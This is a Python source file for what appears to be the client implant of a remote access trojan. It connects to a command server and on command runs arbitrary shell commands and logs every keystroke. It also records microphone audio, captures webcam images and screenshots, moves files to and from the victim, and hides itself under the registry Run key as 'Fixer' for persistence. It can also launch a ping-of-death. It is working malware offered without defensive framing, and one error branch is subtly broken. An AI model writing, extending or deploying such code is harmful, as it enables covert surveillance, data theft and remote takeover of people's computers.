# Client.py

import platform, socket, winreg, subprocess, requests, socketio
from pynput import keyboard
import sounddevice, soundfile, pyautogui, os, uuid, cv2, time

server_ip = 'localhost'
server_port = 8000
info = {}
client = socketio.Client()

persistenceVariable = False
keyloggerVaraible = False
screenshotNumber = 1
pictureNumber = 1
audioNumber = 1
hostname = socket.gethostname()

def record_audio(idNumber, command, hostname):
    global audioNumber
    filename = f"{hostname}_audio_{audioNumber}.wav"
    audio_data = sounddevice.rec(int(5 * 44100), samplerate=44100, channels=2, dtype='int16')
    sounddevice.wait()
    soundfile.write(filename, audio_data, 44100)
    with open(f'{filename}', 'rb') as file:
        file_data = file.read()
        client.emit('module_file', {'idNumber': idNumber, 'command': command, 'hostname' : hostname, 'file_name': filename, 'file_data' : file_data})
    audioNumber += 1
    return filename

def take_picture(idNumber, command, hostname):
    global pictureNumber
    try:
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            return None
        capture, frame = camera.read()
        picture = f"{hostname}_picture_{pictureNumber}.jpg"
        cv2.imwrite(picture, frame)
        with open(f'{picture}', 'rb') as file:
            file_data = file.read()
            client.emit('module_file', {'idNumber': idNumber, 'command': command, 'hostname' : hostname, 'file_name': picture, 'file_data' : file_data})
        pictureNumber += 1
        return picture
    except Exception as e:
        return str(e)

def take_screenshot(idNumber,command,hostname):
    global screenshotNumber
    try:
        filename = f"{hostname}_screenshot_{screenshotNumber}.png"
        screenshot = os.path.join(filename)
        pyautogui.screenshot(screenshot)
        with open(f'{filename}', 'rb') as file:
            file_data = file.read()
            client.emit('module_file', {'idNumber': idNumber, 'command': command, 'hostname' : hostname, 'file_name': filename, 'file_data' : file_data})
        screenshotNumber += 1
        return screenshot
    except Exception as e:
        return str(e)

def create_key(name="default", path="") -> bool:
    reg_key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_WRITE)
    if not reg_key:
        return False
    winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, path)
    reg_key.Close()
    return True

def try_persistence():
    if create_key("Fixer", str(os.path.realpath(__file__))):
        return True
    else:
        return False

def start_keylogger(key):
    try:
        char = getattr(key, 'char', None)
        if char is not None:
            client.emit('keylogs', {'hostname': hostname, 'key': char})
        else:
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.backspace: ' [BACKSPACE] ',
                keyboard.Key.enter: ' \n ',
                keyboard.Key.shift: ' [SHIFT] ',
                keyboard.Key.shift_l: ' [SHIFT] ',
                keyboard.Key.shift_r: ' [SHIFT] ',
                keyboard.Key.tab: ' [TAB] ',
                keyboard.Key.ctrl: ' [CTRL] ',
                keyboard.Key.ctrl_l: ' [CTRL] ',
                keyboard.Key.ctrl_r: ' [CTRL] ',
                keyboard.Key.alt: ' [ALT] ',
                keyboard.Key.alt_l: ' [ALT] ',
                keyboard.Key.alt_r: ' [ALT] ',
                keyboard.Key.alt_gr: ' [ALT] ',
                keyboard.Key.caps_lock: ' [CAPS-LOCK] ',
                keyboard.Key.num_lock: ' [NUM-LOCK] ',
                keyboard.Key.esc: ' [ESC] ',
                keyboard.Key.delete: ' [DELETE] ',
                keyboard.Key.page_up: ' [PAGE-UP] ',
                keyboard.Key.page_down: ' [PAGE-DOWN] ',
                keyboard.Key.insert: ' [INSERT] ',
                keyboard.Key.print_screen: ' [PRINT-SCREEN] ',
            }
            special_key = special_keys.get(key)
            if special_key:
                client.emit('keylogs', {'hostname': hostname, 'key': special_key})
    except Exception as e:
        print("ERROR: Could not process key:", e)

@client.on('ping')
def handle_ping(ping):
    idNumber = ping.get('idNumber')
    command = ping.get('command')
    ip_address = ping.get('ip_address')
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while True:
            line = process.stdout.readline().strip() if process else None
            if not line:
                time.sleep(0.1)
                continue
            if f'Reply from {ip_address}: bytes=65500 time<1ms TTL=128' in line:
                output = "PING-OF-DEATH Command Executed Successfully"
                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                break
            elif f'Reply from {ip_address}: Destination host unreachable.' in line:
                output = "ERROR : Destination host unreachable."
                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                break
            elif f'Unknown host' in line:
                output = "ERROR : Unknown host."
                client.emit('ping_output', {'idNumber': idNumber, 'output': output})
                break
    except Exception as e:
        error_message = str(e)
        client.emit('ping_output', {'idNumber': idNumber, 'output': f"ERROR: {error_message}"})

@client.on('commands')
def handle_commands(commands):
    idNumber = commands.get('idNumber')
    command = commands.get('command')
    hostname = commands.get('hostname')
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        output_str = output.decode('utf-8').strip()
        error_str = error.decode('utf-8').strip()
        if error_str:
            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : error_str})
        else:
            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : output_str})
    except Exception as e:
        return f"ERROR: {str(e)}"

@client.on("module")
def message(module):
    global persistenceVariable, keyloggerVaraible
    idNumber = module.get('idNumber')
    command = module.get('command')
    hostname = module.get('hostname')

    try:
        if command == 'persistence':
            if not persistenceVariable:
                if try_persistence():
                    persistenceVariable = True
                    result = "SUCCESS : Persistence Key Has Been Added"
                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
                else:
                    result = "FAILED : Persistence Key Could Not be Added"
                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
            else:
                result = "RETRY : Persistence Key Already Added"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
        elif command == 'screenshot':
            screenshot_pic = take_screenshot(idNumber,command,hostname)
            if isinstance(screenshot_pic, str):
                result = f"SUCCESS : Screenshot Has Been Captured"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
            else:
                result = f"FAILED : Screenshot Could not be Captured"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
        elif command == 'keylogger':
            if not keyloggerVaraible:
                listener = keyboard.Listener(on_press=start_keylogger)
                listener.start()
                keyloggerVaraible = True
                result = "SUCCESS : Keylogger has been started"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
            elif keyloggerVaraible:
                result = "RETRY : Keylogger has Already been started"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
            else:
                result = "FAILED : Keylogger Could not be started"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
        elif command == 'picture':
            picture_file = take_picture(idNumber, command, hostname)
            if isinstance(picture_file, str):
                result = f"SUCCESS : Picture Has been captured"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
            elif isinstance(take_picture, None):
                result = "ERROR : Could not open WEBCAM (Maybe It doesn't Exist)"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
            else:
                result = f"FAILED : Picture Could not be captured"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
        elif command == 'audio':
            audio_file = record_audio(idNumber, command, hostname)
            if isinstance(audio_file, str):
                result = f"SUCCESS : Audio Has been Recorded"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
            else:
                result = f"FAILED : Audio Could not be recorded"
                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
    except Exception as e:
        result = str(e)
        client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': "EXCEPTION", 'result': result})

@client.on('download')
def upload(input):
    idNumber = input.get('idNumber')
    transfer_type = input.get('transfer_type')
    hostname = input.get('hostname')
    file_name = input.get('file_name')
    if transfer_type == 'download':
        try:
            with open(f'{file_name}', 'rb') as file:
                file_data = file.read()
            client.emit('download_from_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
        except:
            file_data = "File Could not be Read from Client"
            client.emit('download_from_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})

@client.on('upload')
def download(input):
    idNumber = input.get('idNumber')
    transfer_type = input.get('transfer_type')
    hostname = input.get('hostname')
    file_name = input.get('file_name')
    file_data = input.get('file_data')
    if transfer_type == 'upload':
        try:
            with open(file_name, 'wb') as file:
                file.write(file_data)
                status = "File Has Been Uploaded SuccessFully to the Client"
            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
        except:
            status = "File Could not be Uploaded to the Client"
            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})

info['COMMAND'] = 'INFO'
info["idNumber"] = str(uuid.uuid4())
info["hostname"] = socket.gethostname()
info["OS"] = platform.platform()
info["IP"] = requests.get('https://api.ipify.org').text

@client.event
def connect():
    info['sid'] = client.sid
    client.emit('Initial_Information', info)
    print('CLIENT SUCCESSFULLY CONNECTIED TO THE SERVER ✅')

@client.event
def disconnect():
    print('CLIENT PAINFULLY DISCONNECTED FROM THE SERVER ❌')
    client.emit('message', {'COMMAND': 'OUTPUT', 'idNumber': info['idNumber'], 'command': 'status update', 'result': 'Bot is dead'})

print(f"CONNECTING TO THE SERVER {server_ip}:{server_port} ⏳ ")
client.connect(f'http://{server_ip}:{server_port}')
client.wait()
